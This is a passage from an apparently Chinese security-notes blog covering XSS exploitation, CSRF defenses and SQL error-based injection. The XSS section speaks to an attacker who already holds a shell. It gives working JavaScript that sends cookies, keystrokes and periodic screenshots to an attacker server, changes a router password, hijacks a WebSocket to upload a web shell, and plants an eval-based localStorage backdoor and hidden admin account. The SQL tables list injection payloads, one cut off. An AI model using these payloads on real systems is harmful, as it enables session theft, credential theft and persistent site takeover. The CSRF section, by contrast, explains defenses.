class="subst">$&#123;serverHeader&#125;</span>`</span>);</span><br><span class="line">    <span class="comment">// 将结果发送回攻击者服务器</span></span><br><span class="line">    <span class="title function_">fetch</span>(<span class="string">`http://attacker.com/log?url=<span class="subst">$&#123;targetUrl&#125;</span>&amp;server=<span class="subst">$&#123;serverHeader&#125;</span>`</span>);</span><br><span class="line">  &#125;)</span><br><span class="line">  .<span class="title function_">catch</span>(<span class="function"><span class="params">error</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">`Could not connect to <span class="subst">$&#123;targetUrl&#125;</span>`</span>);</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure>

<p><strong>3. 攻击内网路由器或管理后台</strong></p>
<p>许多内网路由器和管理系统都存在默认密码或已知漏洞。攻击者可以利用 XSS 漏洞，在受害者浏览器中构造并发送针对这些设备的请求</p>
<p><strong>示例：利用 CSRF 漏洞修改路由器密码</strong></p>
<p>假设某个路由器修改密码的请求是：<code>POST /admin/password_change</code>，并带上参数 <code>new_password=123456</code>。 攻击者可以通过 JavaScript 构造一个表单并提交，或者直接用 <code>fetch</code> 发送请求</p>
<p><strong>示例代码：</strong></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 假设路由器IP是 192.168.1.1，并且修改密码的路径是 /admin/change_password</span></span><br><span class="line"><span class="keyword">const</span> routerIp = <span class="string">&#x27;192.168.1.1&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> newPassword = <span class="string">&#x27;hacked_by_xss&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> formData = <span class="keyword">new</span> <span class="title class_">FormData</span>();</span><br><span class="line">formData.<span class="title function_">append</span>(<span class="string">&#x27;password&#x27;</span>, newPassword);</span><br><span class="line"></span><br><span class="line"><span class="title function_">fetch</span>(<span class="string">`http://<span class="subst">$&#123;routerIp&#125;</span>/admin/change_password`</span>, &#123;</span><br><span class="line">  <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">  <span class="attr">body</span>: formData</span><br><span class="line">&#125;).<span class="title function_">then</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Router password changed!&#x27;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="XSS-如何绕过-HttpOnly-获取-Cookie"><a href="#XSS-如何绕过-HttpOnly-获取-Cookie" class="headerlink" title="XSS 如何绕过 HttpOnly 获取 Cookie"></a>XSS 如何绕过 HttpOnly 获取 Cookie</h3><p><strong>XST</strong> 是一种利用 HTTP <code>TRACE</code> 或 <code>TRACK</code> 方法的攻击，它在某些特定配置下可以绕过 HttpOnly。当一个网站允许 <code>TRACE</code> 请求时，攻击者可以通过以下步骤进行攻击：</p>
<ol>
<li>攻击者诱导受害者点击一个恶意链接或访问一个包含恶意脚本的页面</li>
<li>恶意脚本向受害者的浏览器发送一个 <code>TRACE</code> 请求</li>
<li>如果服务器没有正确配置，它可能会在 <code>TRACE</code> 响应中包含所有 HTTP 请求头，包括带有 HttpOnly 标志的 Cookie</li>
<li>恶意脚本通过 JavaScript 读取 <code>TRACE</code> 响应的内容，从而获取到 Cookie</li>
</ol>
<p><strong>防御方法：</strong> 禁用 HTTP <code>TRACE</code> 和 <code>TRACK</code> 方法。现代服务器和框架默认都禁用了这些方法，但老旧的系统或错误配置的环境仍可能存在此漏洞</p>
<hr>
<h3 id="有-Shell-的情况下如何使用-XSS-实现对目标站的长久控制"><a href="#有-Shell-的情况下如何使用-XSS-实现对目标站的长久控制" class="headerlink" title="有 Shell 的情况下如何使用 XSS 实现对目标站的长久控制"></a>有 Shell 的情况下如何使用 XSS 实现对目标站的长久控制</h3><p><strong>1. 利用 XSS 劫持管理员会话</strong></p>
<p>这是最直接也最常见的 XSS 攻击方式，但在这里，我们将其作为持久化控制的跳板</p>
<ul>
<li><p><strong>原理：</strong> 当管理员访问存在 XSS 漏洞的页面时，我们的恶意 JavaScript 代码会执行，并窃取管理员的 <code>cookie</code>、<code>sessionStorage</code>、<code>localStorage</code> 等会话信息</p>
</li>
<li><p><strong>实现：</strong></p>
<ul>
<li><strong>WebShell 注入：</strong> 在您已经获取的 Shell 中，找到一个管理员经常访问的、可写入的文件（例如，网站的公共 JS 文件、后台管理页面模板等）</li>
<li><strong>插入 Payload：</strong> 在该文件中插入以下恶意 JavaScript 代码</li>
</ul>
<p>JavaScript</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;http://your-evil-server.com/log.php?cookie=&#x27;</span> + <span class="variable language_">document</span>.<span class="property">cookie</span>);</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>获取会话：</strong> 当管理员访问该页面时，他们的 <code>cookie</code> 就会被发送到您的服务器 <code>log.php</code>。您可以用这些 <code>cookie</code> 伪造会话，从而以管理员身份登录后台</li>
<li><strong>持久化：</strong> 只要您能以管理员身份登录，就可以通过后台修改网站配置，上传新的 WebShell，或者进行其他持久化操作</li>
</ul>
</li>
</ul>
<p>这种方法的优点是简单直接，但缺点是如果管理员退出登录或会话过期，您需要重新等待下一次捕获</p>
<p><strong>2. 利用 XSS 注入后台管理页面后门</strong></p>
<p>这种方法更具隐蔽性和持久性，它旨在直接在后台管理系统中创建可控的“后门”</p>
<ul>
<li><strong>原理：</strong> 很多后台管理系统都允许管理员自定义页面内容、插入自定义代码或编辑模板。我们可以利用 XSS，在管理员的浏览器中执行 JavaScript 代码，悄悄地修改这些配置</li>
<li><strong>实现：</strong><ul>
<li><strong>自动化操作：</strong> 编写一个 JavaScript 脚本，该脚本可以模拟管理员的点击、表单填写和提交操作</li>
<li><strong>创建新用户：</strong> 脚本可以模拟点击“添加用户”按钮，填写一个新的管理员账户信息（例如，用户名：<code>backdoor</code>，密码：<code>P@ssw0rd</code>），然后点击“保存”</li>
<li><strong>修改配置文件：</strong> 脚本还可以模拟打开“系统设置”页面，修改网站的配置，例如允许文件上传、关闭安全限制等</li>
<li><strong>注入 Payload：</strong> 将这些自动化操作的 JavaScript 代码注入到存在 XSS 的页面。当管理员访问时，脚本会在后台静默执行，完成上述操作</li>
</ul>
</li>
</ul>
<p>这种方法的优点是，即使管理员会话过期，我们创建的后门用户依然存在，可以随时用于登录</p>
<p><strong>3. 利用 XSS 劫持 WebSocket 连接</strong></p>
<p>如果目标网站使用了 WebSocket 来进行实时通信，这也是一个非常高明的攻击点</p>
<ul>
<li><p><strong>原理：</strong> WebSocket 是一种在客户端和服务器之间建立持久连接的协议。我们可以利用 XSS，劫持 WebSocket 连接，向服务器发送恶意指令</p>
</li>
<li><p><strong>实现：</strong></p>
<ul>
<li><strong>注入 WebSocket 劫持代码：</strong></li>
</ul>
<p>JavaScript</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 假设原始 WebSocket 连接</span></span><br><span class="line"><span class="keyword">var</span> ws = <span class="keyword">new</span> <span class="title class_">WebSocket</span>(<span class="string">&quot;wss://target.com/websocket&quot;</span>);</span><br><span class="line"><span class="comment">// 劫持</span></span><br><span class="line">ws.<span class="property">onmessage</span> = <span class="keyword">function</span>(<span class="params">event</span>) &#123;</span><br><span class="line">    <span class="comment">// 在这里可以拦截或修改 WebSocket 消息</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Received message from server: &quot;</span> + event.<span class="property">data</span>);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// 发送恶意指令</span></span><br><span class="line">ws.<span class="property">onopen</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// 假设服务器允许通过 WebSocket 发送命令</span></span><br><span class="line">    ws.<span class="title function_">send</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123; <span class="string">&quot;command&quot;</span>: <span class="string">&quot;upload_shell&quot;</span>, <span class="string">&quot;path&quot;</span>: <span class="string">&quot;/uploads/backdoor.php&quot;</span> &#125;));</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>持久化：</strong> 通过劫持 WebSocket，我们可以向服务器发送管理员级别的指令，例如要求服务器上传一个新文件（我们的 WebShell）、执行系统命令、或修改数据库记录</li>
</ul>
</li>
</ul>
<p>这种方法需要对目标网站的 WebSocket 协议有深入了解，但其威力巨大，可以实现几乎实时的控制</p>
<p><strong>4. 利用 XSS 注入浏览器的持久化存储</strong></p>
<ul>
<li><p><strong>原理：</strong> 浏览器中的 <code>localStorage</code> 和 <code>sessionStorage</code> 允许网页存储数据。我们可以利用 XSS，将我们的恶意代码或配置存储在这些地方，从而实现持久化</p>
</li>
<li><p><strong>实现：</strong></p>
<ul>
<li><strong>注入 Payload：</strong></li>
</ul>
<p>JavaScript</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 将恶意代码或配置存储到 localStorage</span></span><br><span class="line"><span class="variable language_">localStorage</span>.<span class="title function_">setItem</span>(<span class="string">&#x27;malicious_flag&#x27;</span>, <span class="string">&#x27;true&#x27;</span>);</span><br><span class="line"><span class="variable language_">localStorage</span>.<span class="title function_">setItem</span>(<span class="string">&#x27;shell_url&#x27;</span>, <span class="string">&#x27;http://your-evil-server.com/shell.php&#x27;</span>);</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>持久化：</strong> 当管理员再次访问该页面时，我们可以检查 <code>localStorage</code> 中的标志，如果存在，则执行后续的恶意操作（例如，加载远程 JS 文件）</li>
</ul>
</li>
</ul>
<p><strong>5. 键盘记录</strong></p>
<ul>
<li><p><strong>原理：</strong> 键盘记录器利用 JavaScript 监听 DOM 事件，例如 <code>keydown</code> 或 <code>keypress</code>，当管理员在后台页面输入账号、密码或其他敏感信息时，脚本会捕获这些按键事件，并将输入的数据发送到攻击者的服务器</p>
</li>
<li><p><strong>实现：</strong></p>
<ol>
<li><strong>注入 Payload：</strong> 在您已经拥有 Shell 的前提下，找到一个管理员经常访问的、可写入的 JS 文件。在该文件中注入以下 JavaScript 代码：</li>
</ol>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 恶意键盘记录脚本</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;keydown&#x27;</span>, <span class="keyword">function</span>(<span class="params">event</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> key = event.<span class="property">key</span>;</span><br><span class="line">    <span class="comment">// 将按键数据发送到你的服务器</span></span><br><span class="line">    <span class="title function_">fetch</span>(<span class="string">&#x27;http://your-evil-server.com/log.php?key=&#x27;</span> + <span class="built_in">encodeURIComponent</span>(key));</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<ol>
<li><strong>实时数据捕获：</strong> 当管理员在后台登录表单中输入用户名和密码时，每个按键都会被记录下来，并通过 <code>fetch</code> 请求发送到您的服务器</li>
<li><strong>持久化：</strong> 这种方法非常隐蔽，因为脚本在后台静默运行。一旦管理员登录，您不仅能获取他们的账号密码，还能实时监控他们在后台进行的任何操作，例如修改文章、上传文件等</li>
</ol>
</li>
</ul>
<p><strong>6. 浏览器屏幕截图</strong></p>
<ul>
<li><p><strong>原理：</strong> 利用 HTML5 的 <code>Canvas</code> 和 <code>toDataURL()</code> 方法，我们可以截取 DOM 元素（例如整个页面）的内容，将其转换为图片数据，并发送给攻击者</p>
</li>
<li><p><strong>实现：</strong></p>
<ol>
<li><strong>注入 Payload：</strong> 在可写入的 JS 文件中注入以下代码：</li>
</ol>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定时截图并发送</span></span><br><span class="line"><span class="built_in">setInterval</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title function_">html2canvas</span>(<span class="variable language_">document</span>.<span class="property">body</span>).<span class="title function_">then</span>(<span class="keyword">function</span>(<span class="params">canvas</span>) &#123;</span><br><span class="line">        <span class="comment">// 将 canvas 内容转换为 base64 格式</span></span><br><span class="line">        <span class="keyword">var</span> imageData = canvas.<span class="title function_">toDataURL</span>(<span class="string">&quot;image/png&quot;</span>);</span><br><span class="line">        <span class="comment">// 将图片数据发送到你的服务器</span></span><br><span class="line">        <span class="title function_">fetch</span>(<span class="string">&#x27;http://your-evil-server.com/screenshot.php&#x27;</span>, &#123;</span><br><span class="line">            <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">            <span class="attr">body</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123; <span class="attr">image</span>: imageData &#125;)</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;, <span class="number">5000</span>); <span class="comment">// 每隔5秒截图一次</span></span><br></pre></td></tr></table></figure>

<ol>
<li><strong>依赖库：</strong> 需要注意的是，这个方法通常依赖第三方库，例如 <code>html2canvas.js</code>。您需要将该库的 JS 文件也注入到目标网站中</li>
<li><strong>实时监控：</strong> 这种方法可以直观地看到管理员在后台的操作界面，包括他们正在编辑的内容、正在上传的文件等，为您的后续攻击提供丰富的上下文信息。</li>
</ol>
</li>
</ul>
<p><strong>7. 利用 XSS 注入持久化 localStorage 后门</strong></p>
<p>这是一种更具隐蔽性的持久化方法，它不依赖于修改网站文件，而是利用浏览器的本地存储功能</p>
<ul>
<li><p><strong>原理：</strong> 利用 <code>localStorage</code> 将恶意代码片段持久化存储在管理员的浏览器中</p>
</li>
<li><p><strong>实现：</strong></p>
<ol>
<li><strong>一次性注入：</strong> 找到一个XSS漏洞点（例如，一个输入框）。输入以下Payload：</li>
</ol>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">localStorage</span>.<span class="title function_">setItem</span>(<span class="string">&#x27;backdoor&#x27;</span>, <span class="string">&#x27;your_malicious_javascript_code&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ol>
<li><strong>主页面加载器：</strong> 然后在网站的主 JS 文件中，注入一个检查 <code>localStorage</code> 的代码：</li>
</ol>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 检查是否存在后门代码</span></span><br><span class="line"><span class="keyword">var</span> backdoorCode = <span class="variable language_">localStorage</span>.<span class="title function_">getItem</span>(<span class="string">&#x27;backdoor&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (backdoorCode) &#123;</span><br><span class="line">    <span class="built_in">eval</span>(backdoorCode); <span class="comment">// 执行后门代码</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol>
<li><strong>持久化：</strong> 只要管理员不清空浏览器缓存，即使您修改的输入框被清理了，后门代码依然会存在于 <code>localStorage</code> 中，并在每次页面加载时被执行</li>
</ol>
<hr>
</li>
</ul>
<h1 id="4-CSRF系列"><a href="#4-CSRF系列" class="headerlink" title="4- CSRF系列"></a>4- CSRF系列</h1><h3 id="SameSite-防御-CSRF-的原理"><a href="#SameSite-防御-CSRF-的原理" class="headerlink" title="SameSite 防御 CSRF 的原理"></a>SameSite 防御 CSRF 的原理</h3><p><strong>1. <code>SameSite=Strict</code></strong></p>
<p>这是最严格的模式。它规定：<strong>只有当请求是同站发出的，浏览器才会发送 Cookie</strong></p>
<ul>
<li><strong>同站请求</strong>：比如你在 <code>bank.com</code> 内部点击一个链接，请求 <code>bank.com/profile</code>，浏览器会发送 Cookie</li>
<li><strong>跨站请求</strong>：当你在 <code>evil.com</code> 上，通过任何方式（表单提交、<code>&lt;img&gt;</code> 标签、<code>&lt;a&gt;</code> 链接）向 <code>bank.com</code> 发起请求时，浏览器<strong>都不会</strong>发送 Cookie</li>
</ul>
<p><strong>防御效果</strong>：<code>Strict</code> 模式可以完全防御 CSRF 攻击，因为恶意请求无法携带会话 Cookie</p>
<p><strong>缺点</strong>：过于严格，可能会影响用户体验。例如，如果你从其他网站（如社交媒体或搜索引擎）点击一个链接跳转到 <code>bank.com</code>，因为这是跨站导航，<code>Strict</code> 模式下的 Cookie 也不会被发送，你可能需要重新登录</p>
<p><strong>2. <code>SameSite=Lax</code></strong></p>
<p>这是折中且更常用的模式。它在 <code>Strict</code> 的基础上做了一些放宽：</p>
<ul>
<li><strong>同站请求</strong>：会发送 Cookie</li>
<li><strong>跨站导航</strong>：当通过 <code>&lt;a href=&quot;...&quot;</code> 链接进行 GET 请求导航时，会发送 Cookie</li>
<li><strong>其他跨站请求</strong>：通过 <code>POST</code> 表单、<code>&lt;img&gt;</code> 标签、<code>&lt;iframe&gt;</code>、AJAX 等方式发起的请求，<strong>不会</strong>发送 Cookie</li>
</ul>
<p><strong>防御效果</strong>：<code>Lax</code> 模式可以防御大部分 CSRF 攻击，特别是那些利用 POST 表单进行的攻击。同时，它允许用户从外部网站通过链接跳转到你的网站，而不会强制重新登录，改善了用户体验</p>
<p><strong>现代浏览器默认行为</strong>：目前，大多数现代浏览器（如 Chrome）已经将 <code>SameSite</code> 的默认值设置为 <code>Lax</code>，即使你在服务器端没有明确设置</p>
<p><strong>3. <code>SameSite=None</code></strong></p>
<p>这是最宽松的模式。它规定：<strong>在任何情况下都发送 Cookie，包括跨站请求</strong></p>
<p><strong>防御效果</strong>：不提供任何 CSRF 防御</p>
<p><strong>使用场景</strong>：通常用于需要跨站发送 Cookie 的场景，例如：</p>
<ul>
<li>OAuth 认证（需要从第三方登录页面返回你的网站并携带 Cookie）</li>
<li>第三方嵌入服务，如嵌入式评论或广告</li>
<li>在这种模式下，为了安全，必须同时设置 <code>Secure</code> 属性，即 <code>SameSite=None; Secure</code>，要求 Cookie 只能通过 HTTPS 发送</li>
</ul>
<hr>
<h3 id="JSON-格式的-CSRF-如何防御"><a href="#JSON-格式的-CSRF-如何防御" class="headerlink" title="JSON 格式的 CSRF 如何防御"></a>JSON 格式的 CSRF 如何防御</h3><p><strong>1. 使用 CSRF Token</strong></p>
<p>这是最常见和最可靠的防御方法</p>
<ul>
<li><p><strong>工作原理</strong>：</p>
<ol>
<li>服务器在用户登录后，生成一个随机、唯一的 CSRF Token，并将其存储在<strong>会话中</strong>或<strong>某个安全的地方</strong>（如 <code>sessionStorage</code>）</li>
<li>服务器将 Token 发送给客户端</li>
<li>客户端在发起任何敏感操作的请求时，都必须将这个 Token 放在<strong>HTTP 请求头</strong>或 <strong>POST 请求体</strong>中</li>
<li>服务器接收到请求后，会验证请求中的 Token 是否与服务器上存储的 Token 相匹配。如果不匹配，则拒绝请求</li>
</ol>
</li>
<li><p><strong>在 JSON 请求中的实践</strong>： 客户端的 JavaScript 代码在发起 POST 请求时，将 Token 放在一个自定义的 HTTP 头中，例如 <code>X-CSRF-TOKEN</code></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;https://your-api.com/transfer&#x27;</span>, &#123;</span><br><span class="line">  <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">  <span class="attr">body</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123; <span class="attr">to</span>: <span class="string">&#x27;attacker&#x27;</span>, <span class="attr">amount</span>: <span class="number">1000</span> &#125;),</span><br><span class="line">  <span class="attr">headers</span>: &#123;</span><br><span class="line">    <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;X-CSRF-TOKEN&#x27;</span>: <span class="string">&#x27;your-generated-token&#x27;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p><strong>防御原理</strong>：攻击者无法从 <code>your-api.com</code> 域获取有效的 CSRF Token。由于同源策略的限制，恶意网站的 JavaScript 无法读取你的 API 返回的 HTML 或 JSON 数据，因此无法获取 CSRF Token。此外，即使是简单请求，自定义的 HTTP 头也会触发预检请求，同样会被 CORS 机制拦截</p>
</li>
</ul>
<p><strong>2. 使用 SameSite Cookie</strong></p>
<p>前面我们讨论过 <code>SameSite</code> 属性。在 JSON API 的场景中，<code>SameSite=Lax</code> 同样是有效的防御</p>
<ul>
<li><p><strong>工作原理</strong>： 将你的会话 Cookie 的 <code>SameSite</code> 属性设置为 <code>Lax</code> 或 <code>Strict</code>。当攻击者从恶意网站发起 POST 请求时，浏览器不会携带这个会话 Cookie。服务器在验证请求时，因为没有会话信息，会直接拒绝请求</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: sessionid=xxxx; SameSite=Lax; Secure; HttpOnly</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>最佳实践</strong>：</p>
<ul>
<li><code>SameSite=Strict</code>：提供了最强的防御，但可能影响用户体验</li>
<li><code>SameSite=Lax</code>：在大多数情况下提供了足够的保护，同时不影响用户从其他网站通过 GET 链接跳转到你的网站</li>
</ul>
</li>
</ul>
<p><strong>3. 验证 Referer 或 Origin 头</strong></p>
<p>这种方法是辅助性的，但可以提供额外的安全层</p>
<ul>
<li><strong>工作原理</strong>： 服务器检查请求头中的 <code>Referer</code> 或 <code>Origin</code> 字段，验证请求的来源是否为你的合法域名<ul>
<li><code>Referer</code>：表示发起请求的 URL</li>
<li><code>Origin</code>：表示请求的来源域，通常用于 CORS 预检请求中</li>
</ul>
</li>
<li><strong>局限性</strong>：<ul>
<li><code>Referer</code> 字段可以被一些浏览器或代理软件修改或删除</li>
<li>这不是一个完全可靠的防御方法，应作为辅助手段而非主要策略</li>
</ul>
</li>
</ul>
<hr>
<h3 id="Ajax-发送-POST-请求会发几个数据包"><a href="#Ajax-发送-POST-请求会发几个数据包" class="headerlink" title="Ajax 发送 POST 请求会发几个数据包"></a>Ajax 发送 POST 请求会发几个数据包</h3><p>AJAX 发送一个 POST 请求，通常会发送<strong>一个</strong>数据包</p>
<p>这个数据包里包含了所有 POST 请求所需的信息，比如请求头（Headers）、请求体（Body）等。请求头里会指定 Content-Type 为 <code>application/x-www-form-urlencoded</code> 或 <code>application/json</code> 等，告诉服务器数据格式。请求体里则携带了实际要发送的数据。</p>
<p><strong>特殊情况：OPTIONS 预检请求</strong></p>
<p>不过，在某些跨域（CORS）场景下，浏览器在正式发送 POST 请求之前，会先发送一个 <strong>OPTIONS</strong> 请求，这个 OPTIONS 请求被称为“<strong>预检请求</strong>”（Preflight Request）</p>
<p>所以，如果满足以下任一条件，浏览器就会先发一个 OPTIONS 预检请求，然后再发 POST 请求：</p>
<ul>
<li>使用了自定义请求头（如 <code>X-Requested-With</code>）</li>
<li>Content-Type 不属于 <code>application/x-www-form-urlencoded</code>、<code>multipart/form-data</code> 或 <code>text/plain</code>。比如，使用了 <code>application/json</code></li>
<li>请求方法为 PUT、DELETE 等，或 POST 请求与服务器的 API 路径不同</li>
</ul>
<p>这个 OPTIONS 请求的目的是询问服务器是否允许当前域名、请求方法、自定义请求头等进行跨域操作。如果服务器返回的响应头里包含了允许的信息（如 <code>Access-Control-Allow-Origin</code>），浏览器才会继续发送实际的 POST 请求</p>
<hr>
<h1 id="5-SQL注入系列"><a href="#5-SQL注入系列" class="headerlink" title="5- SQL注入系列"></a>5- SQL注入系列</h1><h3 id="SQL-报错注入函数有哪些"><a href="#SQL-报错注入函数有哪些" class="headerlink" title="SQL 报错注入函数有哪些"></a>SQL 报错注入函数有哪些</h3><p><strong>MySQL</strong></p>
<table>
<thead>
<tr>
<th>函数&#x2F;方法</th>
<th>利用原理</th>
<th>举例</th>
</tr>
</thead>
<tbody><tr>
<td>updatexml()</td>
<td>修改 XML 文档，不合法的 XPath 路径会报错并显示内容</td>
<td>… AND updatexml(1,concat(0x7e, (SELECT database()), 0x7e),1)</td>
</tr>
<tr>
<td>extractvalue()</td>
<td>从 XML 字符串提取值，不合法的 XPath 路径会报错并显示内容</td>
<td>… AND extractvalue(1, concat(0x7e, (SELECT user())))</td>
</tr>
<tr>
<td>floor()</td>
<td>结合 GROUP BY 和 rand()，制造重复键错误，将数据作为键值显示</td>
<td>… AND (SELECT 1 FROM (SELECT count(), concat(database(),floor(rand(0)2))x FROM information_schema.tables GROUP BY x)a)</td>
</tr>
<tr>
<td>name_const()</td>
<td>用于创建一个带名称的匿名列。当在子查询中，我们使用 <code>NAME_CONST()</code> 将查询结果作为列名，并且这个列名在子查询中已经存在时，就会引发一个“重复列名”的错误，并将查询结果显示出来</td>
<td>AND (SELECT 1 FROM (SELECT count(), concat(database(),floor(rand(0)2))x FROM information_schema.tables GROUP BY x)a)</td>
</tr>
<tr>
<td>exp()</td>
<td>我们可以通过 <code>~</code> 按位取反操作，将一个大的负数转换成一个巨大的正数，从而触发溢出</td>
<td>AND (exp(~(SELECT * FROM (SELECT database())x)))</td>
</tr>
</tbody></table>
<p><strong>SQL Server</strong></p>
<table>
<thead>
<tr>
<th>函数&#x2F;方法</th>
<th>利用原理</th>
<th>举例</th>
</tr>
</thead>
<tbody><tr>
<td>convert() &#x2F; cast()</td>
<td>强制类型转换，将非数字字符串转换为整型会报错并显示字符串内容</td>
<td>… AND 1&#x3D;convert(int,(SELECT db_name()))</td>
</tr>
</tbody></table>
<p><strong>PostgreSQL</strong></p>
<table>
<thead>
<tr>
<th>函数&#x2F;方法</th>
<th>利用原理</th>
<th>举例</th>
</tr>
</thead>
<tbody><tr>
<td>cast()</td>
<td>强制类型转换，将字符串转换为不兼容的数据类型时报错</td>
<td>… AND 1&#x3D;CAST((SELECT version()) as int)</td>
</tr>
</tbody></table>
<p><strong>Oracle</strong></p>
<table>
<thead>
<tr>
<th>函数&#x2F;方法</th>
<th>利用原理</th>
<th>举例</th>
</tr>
</thead>
<tbody><tr>
<td>utl_inaddr.get_host_address()</td>
<td>utl_inaddr.get_host_address() 会将不合法的IP地址或域名作为错误信息的一部分</td>
<td>… AND 1&#x3D;(SELECT utl_inaddr.get_host_address((SELECT user FROM dual)))</td>
</tr>
<tr>
<td>ctxsys.drithsx.sn()</td>
<td>在执行 ctxsys.drithsx.sn() 函数时，不合法的参数会引发错误并显示内容</td>
<td>… AND 1&#x3D;ctxsys.drithsx.sn(1,(SELECT banner FROM v$version WHERE banner LIKE ‘Oracle%’))</td>
</tr>
<tr>
<td>dbms_utility.sqlcode_to_char()</td>
<td>这个函数用于将错误代码转换为字符。它本身不是用来报错的，但可以和其他会报错的函数结合使用</td>
<td>AND 1&#x3D;TO_NUMBER((SELECT ‘a’</td>
</tr>
</tbody></table>
<hr>
<h3 id="SQL-延时盲注-sleep-被禁用怎么绕过"><a href="#SQL-延时盲注-sleep-被禁用怎么绕过" class="headerlink" title="SQL 延时盲注 sleep() 被禁用怎么绕过"></a>SQL 延时盲注 sleep() 被禁用怎么绕过</h3><p><strong>1. 利用 BENCHMARK() 函数</strong></p>
<p><code>BENCHMARK()</code> 函数是 MySQL 中一个非常有用的性能测试函数。它的作用是让一个函数重复执行多次，并返回执行时间。我们可以利用这个特性来造成可控的延时</p>
<ul>
<li><p><strong>原理:</strong> <code>BENCHMARK(count, expr)</code> 会让 <code>expr</code> 表达式执行 <code>count</code> 次。如果我们让它执行一个耗时但无害的操作，就可以造成明显的延时</p>
</li>
<li><p><strong>基本语法:</strong> <code>BENCHMARK(count, expr)</code></p>
</li>
<li><p><strong>利用方式:</strong></p>
